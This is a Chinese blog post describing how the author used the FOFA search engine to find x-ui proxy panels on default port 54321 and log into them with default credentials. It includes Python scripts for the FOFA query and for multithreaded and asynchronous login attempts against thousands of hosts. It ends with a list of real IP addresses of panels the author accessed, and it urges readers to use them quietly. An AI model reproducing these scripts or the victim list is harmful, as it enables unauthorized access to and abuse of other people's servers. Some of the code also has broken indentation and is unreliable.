---
title: 【原创】x-ui面板爬虫爬取及登陆分享
date: 2024-10-31 21:15:18
tags: 原创
categories: 
  - [思路]
  - [python]
---

# x-ui面板爬虫爬取及登陆分享

* **由于最近闲，于是想着干一些事情 于是想到 fofa 黑暗搜索引擎，上去以后搞了一个教育会员，结果发现是企业会员 于是不能浪费，就去想到自己搭建的 x-ui 面板，然后看了一眼 发现默认端口是 54321，默认账号密码是 admin，但是大多数人肯定已经修改了端口和密码，但肯定会有一些人懒到搞，全部是默认。**
* **于是就尝试一下 先去爬取默认端口 54321 的 ip，然后我就爬的不多，就爬了 1w 个 ip，然后对爬到的 ip 进行请求返回值 code 判断是否为 200，为 200 的然后进行默认账号密码继续爬取，最后就爬了几千个 ip，然后成功登陆的有几十个，这里就分享一下 ip，你们上去不要乱搞，可以偷偷用，他们肯定也发现不了**
* **在这里分享一个最后整理的简易的爬虫代码**

#### fofa 代码

```
import requests
import pythonfofa
import sys

def userinfo(client):
    #个人信息
    info = client.userinfo()
    print(info)

def write(results):
    with open('ip.txt', 'a+') as fp:
        for item in results:
            ip = item[0]
            country = item[1]
            print(ip, country)
            fp.write(ip+'|'+country+'\n')

def read():
    for item in open('./ip.txt', 'r'):
        #print(item)
        item = item.split('|')
        ip = item[0]
        country = item[1].replace('\n', '')
        print(country)

def get_ip(client):

    for page in range(1, 2):
        # 查询语句
        query_str = 'port="54321" && title==" 登录 "'
        field = ['ip','country_name']

        #查询结果
        #handle.search(query_text, field, page, size, full)
        data = client.search(query_str,field=field, page=page,size=10000)

        # noinspection PyBroadException
        try:
            results = data['results']
            print(results)
        except Exception as e:
            print('运行错误，账号密码可能出错！')
            print(data)
            sys.exit(1)
            #写入文件
            write(results)

if __name__ == '__main__':
    email, key = ('email','key')
    client = pythonfofa.Client(email,key)

    get_ip(client)
    #read()
```

#### 多线程爆密码

```
import time
import requests
from concurrent.futures import ThreadPoolExecutor

def download(ip, country):
    params = {
    'username': 'admin',
    'password': '123456'
    }
    url = 'http://' + ip + ':54321/login'
    # noinspection PyBroadException
    data = requests.post(url=url, params=params)
    code = data.status_code
    #print(url, data)

    if code == 200:
        data = data.json()
        #print(data)
        if '登录' in data['msg']:
            with open('./ip1-ok.txt', 'a+') as fp:
            print(ip, '获取成功！')
            fp.write(ip + '|' + country + '\n')
            fp.close()
        else:
            print(ip,'密码错误！')
    else:
        print(ip,'访问失败！')


if __name__ == '__main__':
    with ThreadPoolExecutor(500) as t:
        for item in open('./ip.txt', 'r'):
            item = item.split('|')
            ip = item[0]
            #print(url)
            country = item[1].replace('\n', '')
            t.submit(download, ip, country)

            print("全部下载完成！")
```

#### 异步爆密码

```
import asyncio
import aiohttp
import time


async def download(ip):
    params = {
    'username': 'admin',
    'password': 'admin'
    }
    url = 'http://' + ip + ':54321/login'
    #print(url)
    async with aiohttp.ClientSession() as session:
        async with session.post(url, params=params) as req:
            data = await req.text()
            #print(data)
            if '登录' in data:
                print(ip, '成功！')
                with open('ip1-ok.txt','a+') as fp:
                    fp.write(ip + '\n')
            else:
            print(ip,'错误！')
            #请求回来了，写入文件
            # with open(name,'wb') as fp:
            #     #读取内容是异步的，需要 await 挂起
            #     fp.write(await req.content.read())

async def main():
    # urls = [
    #     'https://pic.quanjing.com/c6/cx/QJ6880697447.jpg',
    #     'https://pic.quanjing.com/3g/lv/QJ6594284520.jpg',
    #     'https://pic.quanjing.com/ng/wd/QJ8166536175.jpg',
    #     'https://pic.quanjing.com/hj/jj/QJ6802044841.jpg',
    #     'https://pic.quanjing.com/tn/6t/QJ9127562743.jpg',
    #     'https://pic.quanjing.com/39/uc/QJ7108531848.jpg',
    # ]

    tasks = []
    for item in open('./ip.txt', 'r'):
        item = item.split('|')
        ip = item[0]
        # print(url)
        country = item[1].replace('\n', '')
        d = asyncio.create_task(download(ip))
        tasks.append(d)

await asyncio.wait(tasks)

if __name__ == '__main__':
    t1 = time.time()
    #asyncio.run(main()) 会报错
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

    t2 = time.time()
    print('所需时间：', t2 - t1)
```

在这里主要分享一些思路 和最后爬到的几十个 ip，分享给你们 可以免费用一下，因为在爬取中有重复 ip，但也懒得整理，所以直接分享了。

> [http://5.75.205.179:54321](http://5.75.205.179:54321/) [http://120.55.170.201:54321](http://120.55.170.201:54321/) [http://120.55.170.201:54321](http://120.55.170.201:54321/) [http://192.227.225.235:54321](http://192.227.225.235:54321/) [http://192.227.225.235:54321](http://192.227.225.235:54321/) [http://23.88.126.130:54321](http://23.88.126.130:54321/) [http://23.88.126.130:54321](http://23.88.126.130:54321/) [http://5.255.112.234:54321](http://5.255.112.234:54321/) [http://5.255.112.234:54321](http://5.255.112.234:54321/) [http://135.181.105.138:54321](http://135.181.105.138:54321/) [http://135.181.105.138:54321](http://135.181.105.138:54321/) [http://212.64.214.160:54321](http://212.64.214.160:54321/) [http://212.64.214.160:54321](http://212.64.214.160:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://193.3.182.223:54321](http://193.3.182.223:54321/) [http://193.3.182.223:54321](http://193.3.182.223:54321/) [http://18.163.81.25:54321](http://18.163.81.25:54321/) [http://124.71.219.86:54321](http://124.71.219.86:54321/) [http://124.71.219.86:54321](http://124.71.219.86:54321/) [http://18.163.81.25:54321](http://18.163.81.25:54321/) [http://5.75.205.179:54321](http://5.75.205.179:54321/) [http://5.75.205.179:54321](http://5.75.205.179:54321/) [http://120.55.170.201:54321](http://120.55.170.201:54321/) [http://120.55.170.201:54321](http://120.55.170.201:54321/) [http://192.227.225.235:54321](http://192.227.225.235:54321/) [http://192.227.225.235:54321](http://192.227.225.235:54321/) [http://23.88.126.130:54321](http://23.88.126.130:54321/) [http://23.88.126.130:54321](http://23.88.126.130:54321/) [http://5.255.112.234:54321](http://5.255.112.234:54321/) [http://5.255.112.234:54321](http://5.255.112.234:54321/) [http://135.181.105.138:54321](http://135.181.105.138:54321/) [http://135.181.105.138:54321](http://135.181.105.138:54321/) [http://212.64.214.160:54321](http://212.64.214.160:54321/) [http://212.64.214.160:54321](http://212.64.214.160:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://116.203.57.40:54321](http://116.203.57.40:54321/) [http://79.132.133.53:54321](http://79.132.133.53:54321/) [http://79.132.133.53:54321](http://79.132.133.53:54321/) [http://70.34.215.201:54321](http://70.34.215.201:54321/) [http://70.34.215.201:54321](http://70.34.215.201:54321/) [http://65.21.60.82:54321](http://65.21.60.82:54321/) [http://65.21.60.82:54321](http://65.21.60.82:54321/) [http://212.64.214.194:54321](http://212.64.214.194:54321/) [http://212.64.214.194:54321](http://212.64.214.194:54321/) [http://43.138.153.220:54321](http://43.138.153.220:54321/) [http://43.138.153.220:54321](http://43.138.153.220:54321/) [http://185.126.236.151:54321](http://185.126.236.151:54321/) [http://37.32.13.170:54321](http://37.32.13.170:54321/) [http://185.126.236.151:54321](http://185.126.236.151:54321/) [http://37.32.13.170:54321](http://37.32.13.170:54321/) [http://37.32.13.120:54321](http://37.32.13.120:54321/) [http://37.32.13.120:54321](http://37.32.13.120:54321/) [http://37.32.13.202:54321](http://37.32.13.202:54321/) [http://37.32.13.202:54321](http://37.32.13.202:54321/) [http://34.64.156.188:54321](http://34.64.156.188:54321/) [http://34.64.156.188:54321](http://34.64.156.188:54321/) [http://34.64.49.182:54321](http://34.64.49.182:54321/) [http://34.64.49.182:54321](http://34.64.49.182:54321/) [http://78.109.201.235:54321](http://78.109.201.235:54321/) [http://78.109.201.235:54321](http://78.109.201.235:54321/) [http://38.60.33.153:54321](http://38.60.33.153:54321/) [http://38.60.33.153:54321](http://38.60.33.153:54321/) [http://34.64.62.191:54321](http://34.64.62.191:54321/) [http://34.64.62.191:54321](http://34.64.62.191:54321/)
